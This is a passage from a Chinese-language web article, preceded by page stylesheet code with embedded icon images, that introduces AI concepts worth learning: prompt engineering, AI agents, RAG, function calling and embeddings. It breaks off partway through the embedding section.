a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAACCgAwAEAAAAAQAAACAAAAAAX7wP8AAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAABWVJREFUWAnlVktsVFUY/s85997pC9BOTKxRWnEKsXWlxjWJj0RWJjrFAAXjAlewYWOkgauACVu7a2IiNUEyExM3yoZE3Wmi7qgPJthJBDE6JUNpO3Mf5/j95/bOTOcBlBgXejJ37rn/Of/7O/9/iP7vQ/zTAcjnC4ry+a5ii1OkiYTpuvjvEc0Gp51uivP+ZW+QBuSW4QjW5rptAa1Ey0uOGKOxwPetVyafN6p/52/PkNBbjdAhGaGEpMRjLZTryB8+9MUSYSGNRIcBvm8kBAY9tHYlHz78nTs392xIkwv9FA3Oe33bdoX1ZZKOS0bH0CXI6RugYLW6BwIu5gskkQ4sEG0wYF25PjBzbZfSYY6kDLUmWMt7FR7Lw3xYUkaTdjxHfTPnPwav0iEGYADVa9XIRIEyxrAA0jIQxgFL22gYwF7A8/DAzNVdksJvJaTEUZ2kYnZWziN5s1ADPHneEIXByotYuMSrf9JEbbsuv7VcvbaKML8plXtQR0EdIYDqWEmtOgAomZFH8EjWSnek2ulmtljljttHbmaIHCCCHzd9MjwfsmscBeZH9Jyd10nMvz92UQrtCBKvMF06mQy0SiEdRMEGg8mN0YjAlgoDDkPrMI5qJKSkKKydpbB2CZjJkhIBvOBw2CGQgii85bpx//dMqFRKam5uvH7w+K97oe+Cl0HO68uIBH0qyEzpOMwIbZIcFq0I+9cwoElizCjk2KFI1y7Nnx614W1db58fOXIlMzs7Xn/jeDmvBV2Q0mXjGf554O/m4LZHp2N8r61WPMvLZWLdiC4GMAk5BjeeB5lhv39l6+BIbu3m760hXMDKBD08XBKzR8fr04nygnIypOOAJUx/fHrsi0Mnys+vVK+V4VUohaiyPCo2Q9DFALvF/ikw8WS4QvVZALS5ksw47/7R8ejgTPk1UFqU6/3zp8bOM7B/kdu/fkguPGU5JibW+F0sTjWOUw8DklRrg4BiLGeBqbaRLxjlT4no0InFV402RcftJz41cH/f/JnHP3kZaaF6VX/liwist9vYG5+NU9Cg3MNkt/+lU5wS8fTxq3mc7ILjDlAE4CJpe89BOWPiIjBhi9O6PI4G1jsc6RGB3lZwmS76k8H0zOKTkFboG8jS2krFKCX2fvTeaPHIBwAkMHHgncURnL3nuCSnxSopdIzN5th0BIonJ0Lf9yUA9iMkzdRWl3BixOusfDcwQVcS4UKIFwYfGPnM8wY/DyP9NFMXaTE5BU39tGkDgGZz+fJJG0oYcSaOafLcqdECY4LzfSObSzyUOgxqtyisr8SSNOOAkubWoh3TTaeA2YtFEXPnm5x81/j+6MI6JqyS25WSNU6hbCMKHG84marJbdR+vwakRhQLRuQpbzHRLjmpmijI+OmWCtq+LzWtnX5v30gHSsqmWne74DtiACi2+Wz0iXbuLt9D2cDyoPEkWOiyp5XUIwLMi/wJY1FbH5B9ONtdC1KrsD/Q0MCQAS0wccILORDW25amAeOtooAj/KQxfzF17uwTSQ1v3dJ7jnLINwdZYRDa4tPU0sHVXFo/vxFF5BqFqxRfOmgPCk4ft2NgKTCy2Y47JIEg+MIhjYsLy5I25qUYTQlCjMRHsr/UwdYwIK33UO1J5fFNB9XNO6akcywJofVmXQDP2wfrSPcI2xG5BSs3I+IosHr4EtvO1TDAu16xHQq5+ykMblfRXLbhEoFIdDTBdhldvzl+3CMg60ZktI2vNzLW6IIp0waLklot9L63yzuUp8dJd7bglPFe3hIXstBEP58/s6Ocyr4rH2+866ZNbriTzA0RSOWCwakMl1QJgculxPt8Z7O5GLdtW6bvU8R/nO1vb+hMExVAVtEAAAAASUVORK5CYII=");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 需要学会的技能</h2>
<h3 data-id="heading-1">1.1 提示词工程(prompt)</h3>
<p><strong>用户提供给人工智能的指令或问题，用于引导和激发模型完成特定任务</strong></p>
<h3 data-id="heading-2">1.2 ai agent(智能体）</h3>
<p><strong>能感知环境、自主决策并执行动作以实现目标的智能体</strong></p>
<ul>
<li><strong>核心特征：</strong>  它具备<strong>自主性</strong>，无需每一步都由人类指导</li>
<li><strong>基本框架：</strong>  通常遵循经典的  <strong>“感知-规划-行动”</strong>  
<ul>
<li><strong>感知：</strong>  使用工具（如搜索引擎、摄像头、数据库）获取外界信息。</li>
<li><strong>规划：</strong>  思考如何分解目标并制定步骤</li>
<li><strong>行动：</strong> 执行具体操作（如调用API、控制机械臂、生成文本）来改变环境</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">1.3 RAG</h3>
<p>通过从外部资源或数据库中纳入相关信息来实现知识的增强，一种通过检索外部知识来增强生成内容准确性和相关性的技术。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b9b745c520e406c80afb914d0e1df90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKz55WU55qE6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765473250&amp;x-signature=5uNi5y4hMwxbcWjXsA%2BDsknu%2BLA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">1.4 Function Calling</h3>
<p><strong>与外部函数或API交互的能力，大语言模型根据用户请求，智能识别并输出结构化参数，以调用外部工具或函数的能力</strong></p>
<ol>
<li><strong>它的角色：</strong> 它是大模型（如ChatGPT）与外部世界（如执行代码、查询数据库、调用API）进行交互的“桥梁”和“翻译官”。</li>
<li><strong>工作流程：</strong> 模型不直接执行函数，而是通过分析你的自然语言指令（例如：“给张三发邮件，提醒他明天下午三点开会”），然后输出一个结构化的JSON对象，其中包含需要调用的函数名（<code>send_email</code>）和正确的参数（<code>recipient: "张三"</code>, <code>content: "..."</code>），最后由其他程序来执行这个函数。</li>
</ol>
<h3 data-id="heading-5">1.5 Embedding</h3>
<p><strong>Embedding是将文字、图像或声音等高维复杂数据，转换为一系列低维稠密向量的过程。</strong></p>
<ul>
<li><strong>核心目的：</strong>  将人类能理解的符号（如单词、句子）转换成计算机能够理解和计算的数学形式（即向量）。</li>
<li><strong>关键特性：</strong>
<ul>
